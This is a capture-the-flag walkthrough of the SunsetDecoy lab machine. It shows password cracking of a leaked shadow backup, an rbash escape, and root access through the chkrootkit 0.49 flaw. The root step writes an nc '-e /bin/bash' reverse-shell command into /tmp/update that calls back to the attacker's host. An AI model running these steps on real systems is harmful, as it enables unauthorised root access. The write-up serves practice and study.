# SunsetDecoy

- [Machine information](#machine-information)
- [Solution](#solution)
- [References](#references)

## Machine information

```text
Type: PG Play
Difficulty: Fundamental
Community Rating: Hard
Meta Tags: Walkthrough, Walk-through, Write-up, Writeup
OS: Linux
Points: 5
Lab Description:
In this lab, the target is exploited through a leaked backup of /etc/shadow, which is cracked to 
obtain user credentials. Privilege escalation is achieved by exploiting a known local 
vulnerability in Chkrootkit v0.49 that allows arbitrary command execution as root.
Released: 16 Sep 2020
```

Machine link: [https://portal.offsec.com/machine/sunsetdecoy-419/overview/details](https://portal.offsec.com/machine/sunsetdecoy-419/overview/details)

## Solution

### Scan for services with nmap

We start by scanning the machine with `nmap`

```bash
┌──(kali㉿kali)-[/mnt/…/Wargames/OffSec_PG/PG_Play/SunsetDecoy]
└─$ nmap -v -sV -sC 192.168.249.85
Starting Nmap 7.93 ( https://nmap.org ) at 2024-09-10 11:30 CEST
NSE: Loaded 155 scripts for scanning.
NSE: Script Pre-scanning.
Initiating NSE at 11:30
Completed NSE at 11:30, 0.00s elapsed
Initiating NSE at 11:30
Completed NSE at 11:30, 0.00s elapsed
Initiating NSE at 11:30
Completed NSE at 11:30, 0.00s elapsed
Initiating Ping Scan at 11:30
Scanning 192.168.249.85 [2 ports]
Completed Ping Scan at 11:30, 0.03s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 11:30
Completed Parallel DNS resolution of 1 host. at 11:30, 0.00s elapsed
Initiating Connect Scan at 11:30
Scanning 192.168.249.85 [1000 ports]
Discovered open port 22/tcp on 192.168.249.85
Discovered open port 80/tcp on 192.168.249.85
Completed Connect Scan at 11:30, 0.51s elapsed (1000 total ports)
Initiating Service scan at 11:30
Scanning 2 services on 192.168.249.85
Completed Service scan at 11:30, 6.08s elapsed (2 services on 1 host)
NSE: Script scanning 192.168.249.85.
Initiating NSE at 11:30
Completed NSE at 11:30, 1.23s elapsed
Initiating NSE at 11:30
Completed NSE at 11:30, 0.13s elapsed
Initiating NSE at 11:30
Completed NSE at 11:30, 0.00s elapsed
Nmap scan report for 192.168.249.85
Host is up (0.032s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 a9b53e3be374e4ffb6d59ff181e7a44f (RSA)
|   256 cef3b3e70e90e264ac8d870f1588aa5f (ECDSA)
|_  256 66a98091f3d84b0a69b000229f3c4c5a (ED25519)
80/tcp open  http    Apache httpd 2.4.38
| http-ls: Volume /
| SIZE  TIME              FILENAME
| 3.0K  2020-07-07 16:36  save.zip
|_
| http-methods: 
|_  Supported Methods: GET POST OPTIONS HEAD
|_http-title: Index of /
|_http-server-header: Apache/2.4.38 (Debian)
Service Info: Host: 127.0.0.1; OS: Linux; CPE: cpe:/o:linux:linux_kernel

NSE: Script Post-scanning.
Initiating NSE at 11:30
Completed NSE at 11:30, 0.00s elapsed
Initiating NSE at 11:30
Completed NSE at 11:30, 0.00s elapsed
Initiating NSE at 11:30
Completed NSE at 11:30, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.53 seconds
```

We have two services running:

- Apache httpd v2.4.38 on port 80
- OpenSSH 7.9p1 on port 22

### Check the web site

Browsing manually to port 80 shows a directory listing with one file.

![Web site on SunsetDecoy](Images/Web_site_on_SunsetDecoy.png)

Let's download the file and try to unpack it

```bash
┌──(kali㉿kali)-[/mnt/…/Wargames/OffSec_PG/PG_Play/SunsetDecoy]
└─$ wget http://192.168.249.85/save.zip
--2024-09-10 11:43:53--  http://192.168.249.85/save.zip
Connecting to 192.168.249.85:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 3123 (3.0K) [application/zip]
Saving to: ‘save.zip’

save.zip                                       100%[==================================================================================================>]   3.05K  --.-KB/s    in 0s      

2024-09-10 11:43:53 (300 MB/s) - ‘save.zip’ saved [3123/3123]

┌──(kali㉿kali)-[/mnt/…/Wargames/OffSec_PG/PG_Play/SunsetDecoy]
└─$ unzip save.zip 
Archive:  save.zip
[save.zip] etc/passwd password:  
```

Nope, it's password protected.

### Crack the zip file password

To crack the password of the zip file we first need to get the hash with `zip2john`

```bash
┌──(kali㉿kali)-[/mnt/…/Wargames/OffSec_PG/PG_Play/SunsetDecoy]
└─$ zip2john save.zip > zip_file_hash.txt
ver 2.0 efh 5455 efh 7875 save.zip/etc/passwd PKZIP Encr: TS_chk, cmplen=668, decmplen=1807, crc=B3ACDAFE ts=90AB cs=90ab type=8
ver 2.0 efh 5455 efh 7875 save.zip/etc/shadow PKZIP Encr: TS_chk, cmplen=434, decmplen=1111, crc=E11EC139 ts=834F cs=834f type=8
ver 2.0 efh 5455 efh 7875 save.zip/etc/group PKZIP Encr: TS_chk, cmplen=460, decmplen=829, crc=A1F81C08 ts=8D07 cs=8d07 type=8
ver 2.0 efh 5455 efh 7875 save.zip/etc/sudoers PKZIP Encr: TS_chk, cmplen=368, decmplen=669, crc=FF05389F ts=1535 cs=1535 type=8
ver 2.0 efh 5455 efh 7875 save.zip/etc/hosts PKZIP Encr: TS_chk, cmplen=140, decmplen=185, crc=DFB905CD ts=8759 cs=8759 type=8
ver 1.0 efh 5455 efh 7875 ** 2b ** save.zip/etc/hostname PKZIP Encr: TS_chk, cmplen=45, decmplen=33, crc=D9C379A9 ts=8CE8 cs=8ce8 type=0
NOTE: It is assumed that all files in each archive have the same password.
If that is not the case, the hash may be uncrackable. To avoid this, use
option -o to pick a file at a time.

┌──(kali㉿kali)-[/mnt/…/Wargames/OffSec_PG/PG_Play/SunsetDecoy]
└─$ cat zip_file_hash.txt 
save.zip:$pkzip$6*1*1*0*8*24*8759*a7409df1d7a76ad3809794d387209855bb7638aa589d5be62b9bf373d78055e1dd351925*1*0*8*24*1535*459926ee53809fa53fe26c3e4548cd7819791a638c8d96d3ec7cf18477ffa1e9e2e77944*1*0*8*24*834f*7d2cbe98180e5e9b8c31c5aec89c507011d26766981d17d249e5886e51ac03270b009d62*1*0*8*24*8d07*7d51a96d3e3fa4083bbfbe90ee97ddba1f39f769fcf1b2b6fd573fdca8c97dbec5bc9841*1*0*8*24*90ab*f7fe58aeaaa3c46c54524ee024bd38dae36f3110a07f1e7aba266acbf8b5ff0caf42e05e*2*0*2d*21*d9c379a9*9b9*46*0*2d*8ce8*aae40dfa55b72fd591a639c8c6d35b8cabd267f7edacb40a6ddf1285907b062c99ec6cc8b55d9f0027f553a44f*$/pkzip$::save.zip:etc/hostname, etc/hosts, etc/sudoers, etc/shadow, etc/group, etc/passwd:save.zip
```

Next, we try to crack the hash with [John the Ripper](https://www.openwall.com/john/) and the rockyou wordlist

```bash
┌──(kali㉿kali)-[/mnt/…/Wargames/OffSec_PG/PG_Play/SunsetDecoy]
└─$ john --wordlist=/usr/share/wordlists/rockyou.txt zip_file_hash.txt 
Using default input encoding: UTF-8
Loaded 1 password hash (PKZIP [32/64])
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
manuel           (save.zip)     
1g 0:00:00:00 DONE (2024-09-10 11:49) 12.50g/s 204800p/s 204800c/s 204800C/s 123456..cocoliso
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```

The password is `manuel`.

### Unpack the zip file

Now we can unpack the zip file

```bash
┌──(kali㉿kali)-[/mnt/…/Wargames/OffSec_PG/PG_Play/SunsetDecoy]
└─$ unzip save.zip
Archive:  save.zip
[save.zip] etc/passwd password: 
  inflating: etc/passwd
  inflating: etc/shadow              
  inflating: etc/group               
  inflating: etc/sudoers             
  inflating: etc/hosts               
 extracting: etc/hostname   
```

We get several files (a backup?) from an unknown machine with named with a hash looking name

```bash
┌──(kali㉿kali)-[/mnt/…/Wargames/OffSec_PG/PG_Play/SunsetDecoy]
└─$ cat etc/hostname 
60832e9f188106ec5bcc4eb7709ce592
```

The most interesting files ought to be the [passwd](https://en.wikipedia.org/wiki/Passwd) and [shadow](https://en.wikipedia.org/wiki/Passwd#Shadow_file) file that we can combine and crack.

### Crack the passwd and shadow files

Once again we use `john` to crack the passwords

```bash
┌──(kali㉿kali)-[/mnt/…/Wargames/OffSec_PG/PG_Play/SunsetDecoy]
└─$ unshadow etc/passwd etc/shadow > passwd_combined.txt

┌──(kali㉿kali)-[/mnt/…/Wargames/OffSec_PG/PG_Play/SunsetDecoy]
└─$ john --wordlist=/usr/share/wordlists/rockyou.txt passwd_combined.txt 
Using default input encoding: UTF-8
Loaded 2 password hashes with 2 different salts (sha512crypt, crypt(3) $6$ [SHA512 128/128 AVX 2x])
Cost 1 (iteration count) is 5000 for all loaded hashes
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
server           (296640a3b825115a47b68fc44501c828)     
1g 0:00:42:34 55.05% (ETA: 13:18:32) 0.000391g/s 3116p/s 3123c/s 3123C/s ganesh333..gandarada
1g 0:01:09:51 90.35% (ETA: 13:18:31) 0.000238g/s 3110p/s 3114c/s 3114C/s 1Q-0Q-7Q..1O1792
1g 0:01:16:50 DONE (2024-09-10 13:18) 0.000216g/s 3111p/s 3115c/s 3115C/s !!!playboy!!!7..*7¡Vamos!
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```

We get a password (`server`) for the `296640a3b825115a47b68fc44501c828` user.

### Try to login with SSH

Now that we have both a username and password we can try to login with SSH

```bash
┌──(kali㉿kali)-[/mnt/…/Wargames/OffSec_PG/PG_Play/SunsetDecoy]
└─$ ssh 296640a3b825115a47b68fc44501c828@192.168.249.85
The authenticity of host '192.168.249.85 (192.168.249.85)' can't be established.
ED25519 key fingerprint is SHA256:qzYkm7MeglkL3QtA6bU4nv7yc8jlb1x7fZ7ALPBohNQ.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '192.168.249.85' (ED25519) to the list of known hosts.
296640a3b825115a47b68fc44501c828@192.168.249.85's password: 
Linux 60832e9f188106ec5bcc4eb7709ce592 4.19.0-9-amd64 #1 SMP Debian 4.19.118-2+deb10u1 (2020-06-07) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
-rbash: dircolors: command not found
296640a3b825115a47b68fc44501c828@60832e9f188106ec5bcc4eb7709ce592:~$ ls -la
total 56
drwxr-xr-x 2 296640a3b825115a47b68fc44501c828 296640a3b825115a47b68fc44501c828  4096 Aug 27  2020 .
drwxr-xr-x 3 root                             root                              4096 Jun 27  2020 ..
lrwxrwxrwx 1 root                             root                                 9 Jul  7  2020 .bash_history -> /dev/null
-rw-r--r-- 1 296640a3b825115a47b68fc44501c828 296640a3b825115a47b68fc44501c828   220 Jun 27  2020 .bash_logout
-rw-r--r-- 1 296640a3b825115a47b68fc44501c828 296640a3b825115a47b68fc44501c828  3583 Jun 27  2020 .bashrc
-rwxr-xr-x 1 root                             root                             17480 Jul  7  2020 honeypot.decoy
-rw------- 1 root                             root                              1855 Jul  7  2020 honeypot.decoy.cpp
lrwxrwxrwx 1 root                             root                                 7 Jun 27  2020 id -> /bin/id
lrwxrwxrwx 1 root                             root                                13 Jun 27  2020 ifconfig -> /bin/ifconfig
-rw-r--r-- 1 296640a3b825115a47b68fc44501c828 296640a3b825115a47b68fc44501c828    33 Sep 10 05:27 local.txt
lrwxrwxrwx 1 root                             root                                 7 Jun 27  2020 ls -> /bin/ls
lrwxrwxrwx 1 root                             root                                10 Jun 27  2020 mkdir -> /bin/mkdir
-rwxr-xr-x 1 root                             root                               807 Jun 27  2020 .profile
-rw-r--r-- 1 296640a3b825115a47b68fc44501c828 296640a3b825115a47b68fc44501c828    66 Jun 27  2020 .selected_editor
-rwxrwxrwx 1 296640a3b825115a47b68fc44501c828 296640a3b825115a47b68fc44501c828    32 Aug 27  2020 user.txt
296640a3b825115a47b68fc44501c828@60832e9f188106ec5bcc4eb7709ce592:~$ cat user.txt
-rbash: cat: command not found
296640a3b825115a47b68fc44501c828@60832e9f188106ec5bcc4eb7709ce592:~$ /bin/bash
-rbash: /bin/bash: restricted: cannot specify `/' in command names
296640a3b825115a47b68fc44501c828@60832e9f188106ec5bcc4eb7709ce592:~$ exit
logout
-rbash: /usr/bin/clear_console: restricted: cannot specify `/' in command names
Connection to 192.168.249.85 closed.
```

We seem to be in a restricted `rbash` environment. :-(

It turns out you can run `bash` as a [restricted shell](https://www.gnu.org/software/bash/manual/html_node/The-Restricted-Shell.html) by starting it as `rbash`.

We can confirm this by going back a checking the shell for the user in the `passwd` file

```bash
┌──(kali㉿kali)-[/mnt/…/Wargames/OffSec_PG/PG_Play/SunsetDecoy]
└─$ tail etc/passwd
systemd-resolve:x:103:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:104:110::/nonexistent:/usr/sbin/nologin
avahi-autoipd:x:105:113:Avahi autoip daemon,,,:/var/lib/avahi-autoipd:/usr/sbin/nologin
sshd:x:106:65534::/run/sshd:/usr/sbin/nologin
avahi:x:107:117:Avahi mDNS daemon,,,:/var/run/avahi-daemon:/usr/sbin/nologin
saned:x:108:118::/var/lib/saned:/usr/sbin/nologin
colord:x:109:119:colord colour management daemon,,,:/var/lib/colord:/usr/sbin/nologin
hplip:x:110:7:HPLIP system user,,,:/var/run/hplip:/bin/false
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
296640a3b825115a47b68fc44501c828:x:1000:1000:,,,:/home/296640a3b825115a47b68fc44501c828:/bin/rbash
```

### Escape the rbash environment

Fortunately, there are several ways to [escape the rbash environment](https://www.hacknos.com/rbash-escape-rbash-restricted-shell-escape/).

We login again, but this time with the `--noprofile` parameter

```bash
┌──(kali㉿kali)-[/mnt/…/Wargames/OffSec_PG/PG_Play/SunsetDecoy]
└─$ ssh 296640a3b825115a47b68fc44501c828@192.168.249.85 -t "bash --noprofile"
296640a3b825115a47b68fc44501c828@192.168.249.85's password: 
bash: dircolors: command not found
296640a3b825115a47b68fc44501c828@60832e9f188106ec5bcc4eb7709ce592:~$ ls -la
total 56
drwxr-xr-x 2 296640a3b825115a47b68fc44501c828 296640a3b825115a47b68fc44501c828  4096 Aug 27  2020 .
drwxr-xr-x 3 root                             root                              4096 Jun 27  2020 ..
lrwxrwxrwx 1 root                             root                                 9 Jul  7  2020 .bash_history -> /dev/null
-rw-r--r-- 1 296640a3b825115a47b68fc44501c828 296640a3b825115a47b68fc44501c828   220 Jun 27  2020 .bash_logout
-rw-r--r-- 1 296640a3b825115a47b68fc44501c828 296640a3b825115a47b68fc44501c828  3583 Jun 27  2020 .bashrc
-rwxr-xr-x 1 root                             root                             17480 Jul  7  2020 honeypot.decoy
-rw------- 1 root                             root                              1855 Jul  7  2020 honeypot.decoy.cpp
lrwxrwxrwx 1 root                             root                                 7 Jun 27  2020 id -> /bin/id
lrwxrwxrwx 1 root                             root                                13 Jun 27  2020 ifconfig -> /bin/ifconfig
-rw-r--r-- 1 296640a3b825115a47b68fc44501c828 296640a3b825115a47b68fc44501c828    33 Sep 10 05:27 local.txt
lrwxrwxrwx 1 root                             root                                 7 Jun 27  2020 ls -> /bin/ls
lrwxrwxrwx 1 root                             root                                10 Jun 27  2020 mkdir -> /bin/mkdir
-rwxr-xr-x 1 root                             root                               807 Jun 27  2020 .profile
-rw-r--r-- 1 296640a3b825115a47b68fc44501c828 296640a3b825115a47b68fc44501c828    66 Jun 27  2020 .selected_editor
-rwxrwxrwx 1 296640a3b825115a47b68fc44501c828 296640a3b825115a47b68fc44501c828    32 Aug 27  2020 user.txt
```

### Get the user flag

Now we can try to get the user flag

```bash
296640a3b825115a47b68fc44501c828@60832e9f188106ec5bcc4eb7709ce592:~$ cat user.txt 
bash: cat: command not found
296640a3b825115a47b68fc44501c828@60832e9f188106ec5bcc4eb7709ce592:~$ echo $PATH
PATH:/home/296640a3b825115a47b68fc44501c828/
296640a3b825115a47b68fc44501c828@60832e9f188106ec5bcc4eb7709ce592:~$ /bin/cat user.txt
Your flag is in another file...
296640a3b825115a47b68fc44501c828@60832e9f188106ec5bcc4eb7709ce592:~$ /bin/cat local.txt
5<REDACTED>4
```

### Enumeration

Let's start our enumeration by checking out the honeypot related files in the user's home directory

```bash
296640a3b825115a47b68fc44501c828@60832e9f188106ec5bcc4eb7709ce592:~$ /bin/cat honeypot.decoy.cpp 
/bin/cat: honeypot.decoy.cpp: Permission denied
296640a3b825115a47b68fc44501c828@60832e9f188106ec5bcc4eb7709ce592:~$ ./honeypot.decoy 
--------------------------------------------------

Welcome to the Honey Pot administration manager (HPAM). Please select an option.
1 Date.
2 Calendar.
3 Shutdown.
4 Reboot.
5 Launch an AV Scan.
6 Check /etc/passwd.
7 Leave a note.
8 Check all services status.

Option selected:5

The AV Scan will be launched in a minute or less.
--------------------------------------------------
296640a3b825115a47b68fc44501c828@60832e9f188106ec5bcc4eb7709ce592:~$ 
```

We can install and run [pspy](https://github.com/DominicBreuker/pspy) to identify which process this is.

### Download pspy to the machine

First we check if this is a 32- or 64-bit machine

```bash
296640a3b825115a47b68fc44501c828@60832e9f188106ec5bcc4eb7709ce592:~$ PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
296640a3b825115a47b68fc44501c828@60832e9f188106ec5bcc4eb7709ce592:~$ uname -a
Linux 60832e9f188106ec5bcc4eb7709ce592 4.19.0-9-amd64 #1 SMP Debian 4.19.118-2+deb10u1 (2020-06-07) x86_64 GNU/Linux
```

It's a 64-bit machine.

We download the big (statically linked) 64-bit version of `pspy` to our local Kali machine

```bash
┌──(kali㉿kali)-[/mnt/…/Wargames/OffSec_PG/PG_Play/SunsetDecoy]
└─$ wget https://github.com/DominicBreuker/pspy/releases/download/v1.2.1/pspy64 
--2024-09-10 13:26:24--  https://github.com/DominicBreuker/pspy/releases/download/v1.2.1/pspy64
Resolving github.com (github.com)... 140.82.121.3
Connecting to github.com (github.com)|140.82.121.3|:443... connected.
HTTP request sent, awaiting response... 302 Found
Location: https://objects.githubusercontent.com/github-production-release-asset-2e65be/120821432/860f70be-0564-48f5-a9da-d1c32505ffb0?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=releaseassetproduction%2F20240910%2Fus-east-1%2Fs3%2Faws4_request&X-Amz-Date=20240910T112629Z&X-Amz-Expires=300&X-Amz-Signature=d098d5a96e07c45b3940436c14814c95a5ab906fc2a85e4157b74720374d337a&X-Amz-SignedHeaders=host&actor_id=0&key_id=0&repo_id=120821432&response-content-disposition=attachment%3B%20filename%3Dpspy64&response-content-type=application%2Foctet-stream [following]
--2024-09-10 13:26:29--  https://objects.githubusercontent.com/github-production-release-asset-2e65be/120821432/860f70be-0564-48f5-a9da-d1c32505ffb0?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=releaseassetproduction%2F20240910%2Fus-east-1%2Fs3%2Faws4_request&X-Amz-Date=20240910T112629Z&X-Amz-Expires=300&X-Amz-Signature=d098d5a96e07c45b3940436c14814c95a5ab906fc2a85e4157b74720374d337a&X-Amz-SignedHeaders=host&actor_id=0&key_id=0&repo_id=120821432&response-content-disposition=attachment%3B%20filename%3Dpspy64&response-content-type=application%2Foctet-stream
Resolving objects.githubusercontent.com (objects.githubusercontent.com)... 185.199.110.133, 185.199.108.133, 185.199.109.133, ...
Connecting to objects.githubusercontent.com (objects.githubusercontent.com)|185.199.110.133|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 3104768 (3.0M) [application/octet-stream]
Saving to: ‘pspy64’

pspy64                                         100%[==================================================================================================>]   2.96M  2.42MB/s    in 1.2s    

2024-09-10 13:26:36 (2.42 MB/s) - ‘pspy64’ saved [3104768/3104768]


┌──(kali㉿kali)-[/mnt/…/Wargames/OffSec_PG/PG_Play/SunsetDecoy]
└─$ file pspy64 
pspy64: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), statically linked, Go BuildID=76WWZQViCy6ql1ES8OF9/qm-A2aZqGrGPBMLAIlae/vyWOLysEhkAROHnkT_PJ/z9Awuw2swiJvBBkaumZi, stripped
```

Then we start a local web server on port 8000

```bash
┌──(kali㉿kali)-[/mnt/…/Wargames/OffSec_PG/PG_Play/SunsetDecoy]
└─$ python -m http.server 8000
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

Back at the SunsetDecoy machine we can now get `pspy` with `wget`

```bash
296640a3b825115a47b68fc44501c828@60832e9f188106ec5bcc4eb7709ce592:~$ cd /tmp
296640a3b825115a47b68fc44501c828@60832e9f188106ec5bcc4eb7709ce592:/tmp$ wget http://192.168.45.179:8000/pspy64
--2024-09-10 07:28:06--  http://192.168.45.179:8000/pspy64
Connecting to 192.168.45.179:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 3104768 (3.0M) [application/octet-stream]
Saving to: ‘pspy64’

pspy64                                         100%[==================================================================================================>]   2.96M  3.48MB/s    in 0.9s    

2024-09-10 07:28:07 (3.48 MB/s) - ‘pspy64’ saved [3104768/3104768]
```

The home directory is not writeable so we download it to `/tmp`.

### Identify background processes with pspy

Now we can run `pspy` to identify any processes running in the background

```bash
296640a3b825115a47b68fc44501c828@60832e9f188106ec5bcc4eb7709ce592:/tmp$ chmod +x pspy64 
296640a3b825115a47b68fc44501c828@60832e9f188106ec5bcc4eb7709ce592:/tmp$ ./pspy64 
pspy - version: v1.2.1 - Commit SHA: f9e6a1590a4312b9faa093d8dc84e19567977a6d


     ██▓███    ██████  ██▓███ ▓██   ██▓
    ▓██░  ██▒▒██    ▒ ▓██░  ██▒▒██  ██▒
    ▓██░ ██▓▒░ ▓██▄   ▓██░ ██▓▒ ▒██ ██░
    ▒██▄█▓▒ ▒  ▒   ██▒▒██▄█▓▒ ▒ ░ ▐██▓░
    ▒██▒ ░  ░▒██████▒▒▒██▒ ░  ░ ░ ██▒▓░
    ▒▓▒░ ░  ░▒ ▒▓▒ ▒ ░▒▓▒░ ░  ░  ██▒▒▒ 
    ░▒ ░     ░ ░▒  ░ ░░▒ ░     ▓██ ░▒░ 
    ░░       ░  ░  ░  ░░       ▒ ▒ ░░  
                   ░           ░ ░     
                               ░ ░     

Config: Printing events (colored=true): processes=true | file-system-events=false ||| Scanning for processes every 100ms and on inotify events ||| Watching directories: [/usr /tmp /etc /home /var /opt] (recursive) | [] (non-recursive)
Draining file system events due to startup...
done
2024/09/10 07:29:42 CMD: UID=0     PID=32504  | 
2024/09/10 07:29:42 CMD: UID=1000  PID=4867   | ./pspy64 
2024/09/10 07:29:42 CMD: UID=0     PID=4861   | 
2024/09/10 07:29:42 CMD: UID=1000  PID=1685   | bash --noprofile 
2024/09/10 07:29:42 CMD: UID=1000  PID=1684   | sshd: 296640a3b825115a47b68fc44501c828@pts/0 
2024/09/10 07:29:42 CMD: UID=1000  PID=1675   | (sd-pam) 
2024/09/10 07:29:42 CMD: UID=1000  PID=1674   | /lib/systemd/systemd --user 
2024/09/10 07:29:42 CMD: UID=0     PID=1671   | sshd: 296640a3b825115a47b68fc44501c828 [priv] 
2024/09/10 07:29:42 CMD: UID=0     PID=1650   | 
2024/09/10 07:29:42 CMD: UID=33    PID=1231   | /usr/sbin/apache2 -k start 
2024/09/10 07:29:42 CMD: UID=33    PID=990    | /usr/sbin/apache2 -k start 
2024/09/10 07:29:42 CMD: UID=33    PID=989    | /usr/sbin/apache2 -k start 
<---snip--->
2024/09/10 07:30:01 CMD: UID=0     PID=4878   | /bin/sh -c /bin/bash /root/script.sh 
2024/09/10 07:30:01 CMD: UID=0     PID=4879   | /bin/bash /root/script.sh 
2024/09/10 07:30:01 CMD: UID=0     PID=4882   | /bin/sh /root/chkrootkit-0.49/chkrootkit 
2024/09/10 07:30:01 CMD: UID=0     PID=4881   | /bin/sh /root/chkrootkit-0.49/chkrootkit 
2024/09/10 07:30:01 CMD: UID=0     PID=4880   | /bin/sh /root/chkrootkit-0.49/chkrootkit 
2024/09/10 07:30:01 CMD: UID=0     PID=4896   | /bin/sh /root/chkrootkit-0.49/chkrootkit 
2024/09/10 07:30:01 CMD: UID=0     PID=4897   | /bin/sh /root/chkrootkit-0.49/chkrootkit 
2024/09/10 07:30:01 CMD: UID=0     PID=4898   | /bin/sh /root/chkrootkit-0.49/chkrootkit 
2024/09/10 07:30:01 CMD: UID=0     PID=4902   | /bin/sh /root/chkrootkit-0.49/chkrootkit 
2024/09/10 07:30:01 CMD: UID=0     PID=4901   | /bin/sh /root/chkrootkit-0.49/chkrootkit 
2024/09/10 07:30:01 CMD: UID=0     PID=4900   | /bin/sh /root/chkrootkit-0.49/chkrootkit 
2024/09/10 07:30:01 CMD: UID=0     PID=4899   | /bin/sh /root/chkrootkit-0.49/chkrootkit 
<---snip--->
```

We see that an older version of [chkrootkit](https://www.chkrootkit.org/) is running.

### Check for an exploit

Let's see if there are any exploits available for the version

```bash
┌──(kali㉿kali)-[/mnt/…/Wargames/OffSec_PG/PG_Play/SunsetDecoy]
└─$ searchsploit chkrootkit         
-------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                          |  Path
-------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Chkrootkit - Local Privilege Escalation (Metasploit)                                                                                                    | linux/local/38775.rb
Chkrootkit 0.49 - Local Privilege Escalation                                                                                                            | linux/local/33899.txt
-------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results

┌──(kali㉿kali)-[/mnt/…/Wargames/OffSec_PG/PG_Play/SunsetDecoy]
└─$ searchsploit -m 33899  
  Exploit: Chkrootkit 0.49 - Local Privilege Escalation
      URL: https://www.exploit-db.com/exploits/33899
     Path: /usr/share/exploitdb/exploits/linux/local/33899.txt
    Codes: CVE-2014-0476, OSVDB-107710
 Verified: True
File Type: ASCII text
Copied to: /mnt/hgfs/Wargames/OffSec_PG/PG_Play/SunsetDecoy/33899.txt
```

Yes, there is - a local privesc.

### Examine the exploit

To run the exploit we need to create an `update` file that gets executed

```bash
┌──(kali㉿kali)-[/mnt/…/Wargames/OffSec_PG/PG_Play/SunsetDecoy]
└─$ cat 33899.txt   
We just found a serious vulnerability in the chkrootkit package, which
may allow local attackers to gain root access to a box in certain
configurations (/tmp not mounted noexec).

The vulnerability is located in the function slapper() in the
shellscript chkrootkit:

<---snip--->

Steps to reproduce:

- Put an executable file named 'update' with non-root owner in /tmp (not
mounted noexec, obviously)
- Run chkrootkit (as uid 0)

Result: The file /tmp/update will be executed as root, thus effectively
rooting your box, if malicious content is placed inside the file.

If an attacker knows you are periodically running chkrootkit (like in
cron.daily) and has write access to /tmp (not mounted noexec), he may
easily take advantage of this.

<---snip---> 
```

### Get a reverse shell as root

Let's see if we have netcat available of the machine

```bash
296640a3b825115a47b68fc44501c828@60832e9f188106ec5bcc4eb7709ce592:/tmp$ which nc
/bin/nc
296640a3b825115a47b68fc44501c828@60832e9f188106ec5bcc4eb7709ce592:/tmp$ nc -h
[v1.10-41.1]
connect to somewhere:   nc [-options] hostname port[s] [ports] ... 
listen for inbound:     nc -l -p port [-options] [hostname] [port]
options:
        -c shell commands       as `-e'; use /bin/sh to exec [dangerous!!]
        -e filename             program to exec after connect [dangerous!!]
        -b                      allow broadcasts
        -g gateway              source-routing hop point[s], up to 8
        -G num                  source-routing pointer: 4, 8, 12, ...
        -h                      this cruft
        -i secs                 delay interval for lines sent, ports scanned
        -k                      set keepalive option on socket
        -l                      listen mode, for inbound connects
        -n                      numeric-only IP addresses, no DNS
        -o file                 hex dump of traffic
        -p port                 local port number
        -r                      randomize local and remote ports
        -q secs                 quit after EOF on stdin and delay of secs
        -s addr                 local source address
        -T tos                  set Type Of Service
        -t                      answer TELNET negotiation
        -u                      UDP mode
        -v                      verbose [use twice to be more verbose]
        -w secs                 timeout for connects and final net reads
        -C                      Send CRLF as line-ending
        -z                      zero-I/O mode [used for scanning]
port numbers can be individual or ranges: lo-hi [inclusive];
hyphens in port names must be backslash escaped (e.g. 'ftp\-data').
```

Yes, a version that supports the `-e` parameter!

We start a netcat listener back at our Kali machine

```bash
┌──(kali㉿kali)-[/mnt/…/Wargames/OffSec_PG/PG_Play/SunsetDecoy]
└─$ nc -lvnp 12345                                       
listening on [any] 12345 ...
```

And create a reverse shell in the `update` file

```bash
296640a3b825115a47b68fc44501c828@60832e9f188106ec5bcc4eb7709ce592:/tmp$ echo "/bin/nc -e /bin/bash 192.168.45.179 12345" > update
296640a3b825115a47b68fc44501c828@60832e9f188106ec5bcc4eb7709ce592:/tmp$ chmod +x update 
```

### Get the root flag

And then we wait for a connection and get the root flag

```bash
┌──(kali㉿kali)-[/mnt/…/Wargames/OffSec_PG/PG_Play/SunsetDecoy]
└─$ nc -lvnp 12345                                       
listening on [any] 12345 ...
connect to [192.168.45.179] from (UNKNOWN) [192.168.249.85] 35520
id
uid=0(root) gid=0(root) groups=0(root)
cd /root
ls -la
total 36
drwx------  3 root                             root                             4096 Sep 10 05:27 .
drwxr-xr-x 18 root                             root                             4096 Jul 12  2020 ..
lrwxrwxrwx  1 root                             root                                9 Jul  7  2020 .bash_history -> /dev/null
-rw-r--r--  1 root                             root                              570 Jan 31  2010 .bashrc
drwxr-xr-x  2 296640a3b825115a47b68fc44501c828 296640a3b825115a47b68fc44501c828 4096 Jul 30  2009 chkrootkit-0.49
-rw-r--r--  1 root                             root                              148 Aug 17  2015 .profile
-rw-r--r--  1 root                             root                               33 Sep 10 05:27 proof.txt
-rw-r--r--  1 root                             root                               32 Aug 27  2020 root.txt
-rw-r--r--  1 root                             root                              137 Jul  7  2020 script.sh
